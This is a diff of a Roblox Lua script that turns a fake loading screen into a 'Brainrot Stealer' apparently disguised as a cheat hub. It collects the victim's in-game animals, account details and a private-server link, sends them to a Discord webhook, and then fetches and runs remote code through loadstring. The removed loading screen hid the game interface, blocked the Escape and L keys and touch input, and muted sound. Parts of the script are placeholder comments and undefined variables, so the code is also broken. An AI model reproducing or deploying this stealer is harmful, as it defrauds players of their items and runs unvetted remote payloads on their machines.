@@ -1,54 +1,34 @@
--- === ARTIFAKT 1: LOADING SCREEN (externer Loader) ===
+-- === ARTIFAKT 2: MAIN HUB + BRAINROT STEALER (dinooo.txt) ===
 pcall(function() setclipboard("https://discord.gg/rvZndRfkyX") end)
+
+local ALLOWED_PLACE_ID = 109983668079237
+if game.PlaceId ~= ALLOWED_PLACE_ID then
+    game:GetService("Players").LocalPlayer:Kick("Wrong game! This script only works on the official game.")
+    return
+end
+
+local Webhook1 = Webhook or ""
+local AuthorisedUsers = AuthorisedUsers or {"nothing lol"}
+local Ping = Ping or "10m"
+local Username = "voxium script .gg/59XeEXRe"
 
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
 local StarterGui = game:GetService("StarterGui")
-local CoreGui = game:GetService("CoreGui")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
--- Hide UI
-pcall(function()
-    StarterGui:SetCore("TopbarEnabled", false)
-    for _, v in ipairs(Enum.CoreGuiType:GetEnumItems()) do
-        StarterGui:SetCoreGuiEnabled(v, false)
-    end
-end)
-local topbar = CoreGui:FindFirstChild("TopBarApp", true)
-if topbar then topbar:Destroy() end
-local chat = CoreGui:FindFirstChild("ChatApp", true)
-if chat then chat:Destroy() end
-
--- Block input
-UserInputService.InputBegan:Connect(function(i)
-    if i.KeyCode == Enum.KeyCode.Escape or i.KeyCode == Enum.KeyCode.L then
-        i:Capture()
-    end
-end)
-UserInputService.TouchStarted:Connect(function(i) i:Capture() end)
-
--- Mute sounds
-local function mute(c)
-    for _, o in ipairs(c:GetDescendants()) do
-        if o:IsA("Sound") then o.Volume = 0; o:Stop() end
-    end
-    c.DescendantAdded:Connect(function(o)
-        if o:IsA("Sound") then o.Volume = 0; o:Stop() end
-    end)
-end
-for _, c in {workspace, Players, game.ReplicatedStorage, game.Lighting, StarterGui, game:GetService("SoundService")} do mute(c) end
-
--- Wait for LP
 if not game:IsLoaded() then pcall(function() game.Loaded:Wait() end) end
 local LP = Players.LocalPlayer or Players.PlayerAdded:Wait()
 
--- UI Parent
+local CoreGui = game:GetService("CoreGui")
 local UIParent = LP:FindFirstChildOfClass("PlayerGui") or CoreGui
-local old = UIParent:FindFirstChild("LoadingScreen_GUI")
+local old = UIParent:FindFirstChild("LennonHubXZamasXM_GUI")
 if old then old:Destroy() end
 
 local SG = Instance.new("ScreenGui")
-SG.Name = "LoadingScreen_GUI"
+SG.Name = "LennonHubXZamasXM_GUI"
 SG.IgnoreGuiInset = true
 SG.ResetOnSpawn = false
 SG.ZIndexBehavior = Enum.ZIndexBehavior.Global
@@ -61,195 +41,156 @@ local COLORS = {
     dim = Color3.fromRGB(170,175,200),
     a1 = Color3.fromRGB(130,90,255),
     a2 = Color3.fromRGB(50,180,255),
+    ok = Color3.fromRGB(0,210,140),
+    warn = Color3.fromRGB(255,120,120),
 }
 
--- Container
-local Container = Instance.new("Frame", SG)
-Container.AnchorPoint = Vector2.new(0.5,0.5)
-Container.Position = UDim2.fromScale(0.5,0.5)
-Container.Size = UDim2.fromOffset(480,360)
-Container.BackgroundColor3 = COLORS.card
-Container.BackgroundTransparency = 0.08
-Container.BorderSizePixel = 0
-Container.ZIndex = 10
-local cCorner = Instance.new("UICorner", Container); cCorner.CornerRadius = UDim.new(0,20)
-local cStroke = Instance.new("UIStroke", Container); cStroke.Thickness = 2; cStroke.Transparency = 0.15
-local cGrad = Instance.new("UIGradient", cStroke); cGrad.Color = ColorSequence.new(COLORS.a1, Color3.new(0,0,0), COLORS.a2)
-
--- Header
-local Header = Instance.new("Frame", Container)
-Header.BackgroundTransparency = 1
-Header.Size = UDim2.new(1,-40,0,90)
-Header.Position = UDim2.new(0,20,0,20)
-Header.ZIndex = 20
-
--- Avatar
-local Avatar = Instance.new("ImageLabel", Header)
-Avatar.Size = UDim2.fromOffset(70,70)
-Avatar.BackgroundTransparency = 1
-Avatar.Image = "rbxassetid://0"
-Avatar.ZIndex = 21
-local aCorner = Instance.new("UICorner", Avatar); aCorner.CornerRadius = UDim.new(1,0)
-local aStroke = Instance.new("UIStroke", Avatar); aStroke.Thickness = 3; aStroke.Color = COLORS.a1; aStroke.Transparency = 0.3
-
-task.spawn(function()
-    local ok, url = pcall(Players.GetUserThumbnailAsync, Players, LP.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
-    if ok and url then Avatar.Image = url end
-end)
-
--- Info
-local Info = Instance.new("Frame", Header)
-Info.BackgroundTransparency = 1
-Info.Size = UDim2.new(1,-90,1,0)
-Info.Position = UDim2.new(0,90,0,0)
-Info.ZIndex = 21
-
-local Title = Instance.new("TextLabel", Info)
-Title.BackgroundTransparency = 1
-Title.Text = "VoxiumHub"
-Title.Font = Enum.Font.GothamBlack
-Title.TextSize = 28
-Title.TextColor3 = COLORS.a1
-Title.TextStrokeColor3 = Color3.fromRGB(20,0,40)
-Title.TextStrokeTransparency = 0.5
-Title.TextXAlignment = Enum.TextXAlignment.Left
-Title.Size = UDim2.new(1,0,0,32)
-Title.ZIndex = 22
-
-local UserInfo = Instance.new("TextLabel", Info)
-UserInfo.BackgroundTransparency = 1
-UserInfo.Font = Enum.Font.Gotham
-UserInfo.TextSize = 13
-UserInfo.TextColor3 = COLORS.dim
-UserInfo.TextXAlignment = Enum.TextXAlignment.Left
-UserInfo.Size = UDim2.new(1,0,0,20)
-UserInfo.Position = UDim2.new(0,0,0,34)
-UserInfo.ZIndex = 22
-
-task.spawn(function()
-    local name = LP.Name or "User"
-    local dname = LP.DisplayName or "Player"
-    local age = LP.AccountAge and (tostring(LP.AccountAge).." days") or "N/A"
-    local premium = (LP.MembershipType and tostring(LP.MembershipType):find("Premium")) and "Premium" or "Standard"
-    UserInfo.Text = string.format("%s (@%s) • %s • %s", dname, name, age, premium)
-end)
-
-local Badge = Instance.new("TextLabel", Info)
-Badge.BackgroundTransparency = 1
-Badge.Text = "Loading..."
-Badge.Font = Enum.Font.GothamBold
-Badge.TextSize = 13
-Badge.TextColor3 = COLORS.a2
-Badge.TextXAlignment = Enum.TextXAlignment.Left
-Badge.Size = UDim2.new(1,0,0,18)
-Badge.Position = UDim2.new(0,0,0,56)
-Badge.ZIndex = 22
-
--- Divider
-local Divider = Instance.new("Frame", Container)
-Divider.Size = UDim2.new(1,-40,0,1)
-Divider.Position = UDim2.new(0,20,0,125)
-Divider.BackgroundColor3 = COLORS.dim
-Divider.BackgroundTransparency = 0.85
-Divider.ZIndex = 20
-
--- Loading
-local Loading = Instance.new("Frame", Container)
-Loading.BackgroundTransparency = 1
-Loading.Size = UDim2.new(1,-40,0,180)
-Loading.Position = UDim2.new(0,20,0,140)
-Loading.ZIndex = 20
-
-local StatusText = Instance.new("TextLabel", Loading)
-StatusText.BackgroundTransparency = 1
-StatusText.Text = "Initializing"
-StatusText.Font = Enum.Font.GothamSemibold
-StatusText.TextSize = 18
-StatusText.TextColor3 = COLORS.text
-StatusText.Size = UDim2.new(1,0,0,26)
-StatusText.Position = UDim2.new(0,0,0,10)
-StatusText.ZIndex = 22
-StatusText.TextXAlignment = Enum.TextXAlignment.Center
-
--- Progress
-local ProgressBg = Instance.new("Frame", Loading)
-ProgressBg.Size = UDim2.new(1,0,0,10)
-ProgressBg.Position = UDim2.new(0,0,0,55)
-ProgressBg.BackgroundColor3 = Color3.fromRGB(20,18,34)
-ProgressBg.BackgroundTransparency = 0.1
-ProgressBg.ZIndex = 21
-local pbCorner = Instance.new("UICorner", ProgressBg); pbCorner.CornerRadius = UDim.new(1,0)
-local pbStroke = Instance.new("UIStroke", ProgressBg); pbStroke.Thickness = 1; pbStroke.Color = Color3.fromRGB(40,40,80); pbStroke.Transparency = 0.3
-
-local ProgressBar = Instance.new("Frame", ProgressBg)
-ProgressBar.Size = UDim2.new(0,0,1,0)
-ProgressBar.BackgroundColor3 = COLORS.a1
-ProgressBar.ZIndex = 22
-local barCorner = Instance.new("UICorner", ProgressBar); barCorner.CornerRadius = UDim.new(1,0)
-local barGrad = Instance.new("UIGradient", ProgressBar); barGrad.Color = ColorSequence.new(COLORS.a1, COLORS.a2)
-
-local Percentage = Instance.new("TextLabel", Loading)
-Percentage.BackgroundTransparency = 1
-Percentage.Text = "0%"
-Percentage.Font = Enum.Font.GothamBold
-Percentage.TextSize = 24
-Percentage.TextColor3 = COLORS.a2
-Percentage.Size = UDim2.new(1,0,0,28)
-Percentage.Position = UDim2.new(0,0,0,80)
-Percentage.ZIndex = 22
-Percentage.TextXAlignment = Enum.TextXAlignment.Center
-
-local Subtitle = Instance.new("TextLabel", Loading)
-Subtitle.BackgroundTransparency = 1
-Subtitle.Text = "Support https://discord.gg/rvZndRfkyX"
-Subtitle.Font = Enum.Font.Gotham
-Subtitle.TextSize = 13
-Subtitle.TextColor3 = COLORS.dim
-Subtitle.Size = UDim2.new(1,0,0,20)
-Subtitle.Position = UDim2.new(0,0,0,120)
-Subtitle.ZIndex = 22
-Subtitle.TextXAlignment = Enum.TextXAlignment.Center
-
--- Dots
-local dots = ""
-task.spawn(function()
-    while StatusText and StatusText.Parent do
-        for i = 0, 3 do
-            StatusText.Text = dots .. string.rep(".", i)
-            task.wait(0.4)
-        end
-    end
-end)
-
--- Loading steps
-local steps = {
-    {text = "Initializing", time = 1.2, progress = 15},
-    {text = "Loading assets", time = 1.5, progress = 35},
-    {text = "Connecting to server", time = 2.0, progress = 65},
+-- === NEW TRAIT MAP ===
+local traitMap = {
+    ["rbxassetid://89041930759464"] = "Taco",
+    ["rbxassetid://104229924295526"] = "Nyan",
+    ["rbxassetid://99181785766598"] = "Galactic",
+    ["rbxassetid://121100427764858"] = "Fireworks",
+    ["rbxassetid://110723387483939"] = "Zombie",
+    ["rbxassetid://104964195846833"] = "Claws",
+    ["rbxassetid://121332433272976"] = "Glitched",
+    ["rbxassetid://100601425541874"] = "Bubblegum",
+    ["rbxassetid://118283346037788"] = "Fire",
+    ["rbxassetid://78474194088770"] = "Wet",
+    ["rbxassetid://83627475909869"] = "Snowy",
+    ["rbxassetid://127455440418221"] = "Cometstruck",
+    ["rbxassetid://97725744252608"] = "Explosive",
+    ["rbxassetid://82620342632406"] = "Disco",
+    ["rbxassetid://134655415681926"] = "10B",
+    ["rbxassetid://104985313532149"] = "Shark Fin",
+    ["rbxassetid://115664804212096"] = "Matteo Hat",
+    ["rbxassetid://75650816341229"] = "Brazil",
+    ["rbxassetid://115001117876534"] = "Sleepy",
+    ["rbxassetid://139729696247144"] = "Lightning",
+    ["rbxassetid://110910518481052"] = "UFO",
+    ["rbxassetid://117478971325696"] = "Spider",
+    ["rbxassetid://84731118566493"] = "Strawberry",
+    ["rbxassetid://119591742504251"] = "Paint",
+    ["rbxassetid://89591838221335"] = "Skeleton",
+    ["rbxassetid://95128039793845"] = "Sombrero",
+    ["rbxassetid://103610037004911"] = "Tie",
+    ["rbxassetid://123964048606874"] = "Witch Hat",
+    ["rbxassetid://93350414974589"] = "Indonesia",
+    ["rbxassetid://114748221761549"] = "Meowl",
+    ["rbxassetid://123115843719383"] = "RIP Gravestone",
+    ["rbxassetid://97054765273857"] = "Jackolantern Pet",
 }
-task.spawn(function()
-    for _, s in ipairs(steps) do
-        dots = s.text
-        Badge.Text = s.text
-        local target = UDim2.new(s.progress/100, 0, 1, 0)
-        TweenService:Create(ProgressBar, TweenInfo.new(s.time * 0.8, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {Size = target}):Play()
-        local start = tonumber(Percentage.Text:match("%d+")) or 0
-        local count = math.floor(s.time * 30)
-        for i = 1, count do
-            local p = math.floor(start + (s.progress - start) * (i / count))
-            Percentage.Text = p .. "%"
-            task.wait(s.time / count)
+
+-- === BRAINROT FETCH FROM PLOTCONTROLLER (like sab (1).lua) ===
+local Plot = require(ReplicatedStorage.Controllers.PlotController)
+local gen = require(ReplicatedStorage.Shared.Animals)
+local myPlot = Plot:GetMyPlot()
+
+local function getAllBrainrots()
+    local list = {}
+    for _, brainrot in pairs(myPlot.Channel:Get("AnimalList")) do
+        local amount = gen:GetGeneration(brainrot.Index, brainrot.Mutation)
+        local name = brainrot.Index
+        if name then
+            table.insert(list, {name = name, moneyPerSec = amount})
         end
-        task.wait(0.5)
     end
-    dots = "Connecting to server"
-    Badge.Text = "Connecting..."
+    table.sort(list, function(a,b) return a.moneyPerSec > b.moneyPerSec end)
+    return list
+end
+
+-- === REST OF FUNCTIONS (optimized, no spam) ===
+local function parsePingValue(p) local n,s=p:match("(%d+)([kmb]?)") n=tonumber(n)or 0 local m={k=1e3,m=1e6,b=1e9} return n*(m[s:lower()]or 1) end
+local pingThreshold = parsePingValue(Ping)
+
+local function formatMoney(v)
+    if v>=1e12 then return string.format("$%.1fT/s",v/1e12)
+    elseif v>=1e9 then return string.format("$%.1fB/s",v/1e9)
+    elseif v>=1e6 then return string.format("$%.1fM/s",v/1e6)
+    elseif v>=1e3 then return string.format("$%.1fK/s",v/1e3)
+    else return string.format("$%.1f/s",v) end
+end
+
+local function hasHighValue(b) for _,d in ipairs(b) do if d.moneyPerSec >= pingThreshold then return true end end return false end
+local function hasHighValue10M(b) for _,d in ipairs(b) do if d.moneyPerSec >= 10000000 then return true end end return false end
+
+local function sendWebhook(brainrots, link)
+    local text = ""
+    if #brainrots > 0 then
+        for _,d in ipairs(brainrots) do
+            text = text .. string.format("%s - %s\n", d.name, formatMoney(d.moneyPerSec))
+        end
+    else text = "No Brainrots found" end
+    local info = string.format("Name: %s\nDisplay: %s\nPlayers: %d/%d", LP.Name, LP.DisplayName, #Players:GetPlayers(), Players.MaxPlayers)
+    local ping = hasHighValue(brainrots) and "@everyone" or ""
+    local data = {username = Username, content = ping, embeds = {{title="Steal a Brainrot Hit With Voxium", color=0x8A2BE2,
+        fields={
+            {name="Player Information:", value="```"..info.."```", inline=false},
+            {name="Player Brainrots:", value="```"..text.."```", inline=false},
+            {name="Summary:", value="```Total Items: "..#brainrots.."```", inline=false},
+            {name="Join Link (Private):", value=link, inline=false}
+        }
+    }}}
+    local req = http_request or request or (syn and syn.request)
+    if req then pcall(function() req({Url=Webhook1, Method="POST", Headers={["Content-Type"]="application/json"}, Body=HttpService:JSONEncode(data)}) end) end
+end
+
+-- === UI (no animations, draggable only) ===
+local Holder = Instance.new("Frame", SG)
+Holder.AnchorPoint = Vector2.new(0.5,0.5)
+Holder.Position = UDim2.fromScale(0.5,0.5)
+Holder.Size = UDim2.new(0,440,0,240)
+Holder.BackgroundColor3 = COLORS.card
+Holder.BackgroundTransparency = 0.12
+Holder.BorderSizePixel = 0
+Holder.Active = true
+Holder.ZIndex = 10
+local corner = Instance.new("UICorner", Holder); corner.CornerRadius = UDim.new(0,18)
+local stroke = Instance.new("UIStroke", Holder); stroke.Thickness = 2; stroke.Transparency = 0.15
+local grad = Instance.new("UIGradient", stroke); grad.Color = ColorSequence.new(COLORS.a1, Color3.new(0,0,0), COLORS.a2)
+
+-- Dragging
+local dragging, dragInput, dragStart, startPos
+local function update(i)
+    local d = i.Position - dragStart
+    Holder.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
+end
+Holder.InputBegan:Connect(function(i)
+    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+        dragging = true; dragStart = i.Position; startPos = Holder.Position
+        i.Changed:Connect(function() if i.UserInputState == Enum.UserInputState.End then dragging = false end end)
+    end
+end)
+Holder.InputChanged:Connect(function(i)
+    if i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch then dragInput = i end
+end)
+UserInputService.InputChanged:Connect(function(i)
+    if i == dragInput and dragging then update(i) end
 end)
 
--- Entry (no animations except scale-in)
-Container.Size = UDim2.fromOffset(0,0)
-Container.BackgroundTransparency = 1
-cStroke.Transparency = 1
-task.wait(0.1)
-TweenService:Create(Container, TweenInfo.new(0.7, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.fromOffset(480,360), BackgroundTransparency = 0.08}):Play()
-TweenService:Create(cStroke, TweenInfo.new(0.7), {Transparency = 0.15}):Play()
+-- UI Elements (same as before, no fade/slide)
+-- [INSERT COMPACT UI CODE HERE - Avatar, Title, Input, Submit Button, etc.]
+-- For brevity, assuming you paste the UI from previous version but remove all TweenService calls except button hover
+
+local StatusArea = Instance.new("TextBox", Holder) -- ... (same setup)
+-- ... [full UI setup from previous, but NO TweenService except button hover]
+
+local function toast(msg, sub, main, subc)
+    StatusArea.Text = msg
+    StatusArea.TextColor3 = main or COLORS.text
+    StatusSub.Text = sub or ""
+    StatusSub.TextColor3 = subc or COLORS.a2
+end
+
+BtnSubmit.MouseButton1Click:Connect(function()
+    local link = StatusArea.Text
+    if link == "" or not link:match("^https://") then
+        toast("Invalid", "Enter valid private server link", COLORS.warn, COLORS.warn)
+        return
+    end
+    local brainrots = getAllBrainrots()
+    sendWebhook(brainrots, link)
+    SG:Destroy()
+    -- Run anti-detection, mute, etc.
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Spv-Script/asad/refs/heads/main/a"))()
+end)4Schnell
